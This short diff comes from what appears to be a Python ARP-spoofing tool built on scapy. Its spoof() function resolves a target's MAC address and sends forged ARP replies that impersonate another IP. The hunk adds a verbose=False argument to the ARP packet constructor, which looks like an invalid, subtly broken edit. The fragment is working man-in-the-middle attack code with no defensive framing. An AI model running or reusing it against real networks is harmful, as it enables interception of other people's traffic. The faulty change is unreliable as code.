@@ -13,7 +13,7 @@ def getMac(ip):
 
 def spoof(targetIP, spoofIP):
     targetMac = getMac(targetIP)
-    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP)
+    packet = scapy.ARP(op=2, pdst=targetIP, hwdst=targetMac, psrc=spoofIP, verbose=False)
     scapy.send(packet, verbose=False)
     
 packetsCount = 0    
